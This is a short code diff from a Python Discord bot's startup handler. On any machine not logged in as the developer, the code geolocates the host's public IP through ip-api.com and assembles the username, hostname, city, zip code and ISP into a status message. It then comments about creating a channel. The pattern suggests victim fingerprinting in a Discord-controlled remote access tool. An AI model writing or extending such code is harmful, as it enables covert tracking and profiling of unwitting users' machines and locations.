@@ -134,14 +134,14 @@ async def on_ready():
 
         response = requests.get('http://ip-api.com/json/')
 
-        if not os.getlogin() == "DEV":
+        if not os.getlogin() == DEV:
             response = requests.get('http://ip-api.com/json/')
             if response.status_code == 200:
                 geolocation_data = response.json()
                 IPloc = f"# Geolocation Data:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
             else:
                 IPloc = "Error retrieving geolocation data."
-            running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.getenv('HOSTNAME')}\n{IPloc}\n-----"
+            running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.uname().nodename}\n{IPloc}\n-----"
         else: running = "Bot is ready and running!"
 
         # Kanal erstellen und Berechtigungen setzen
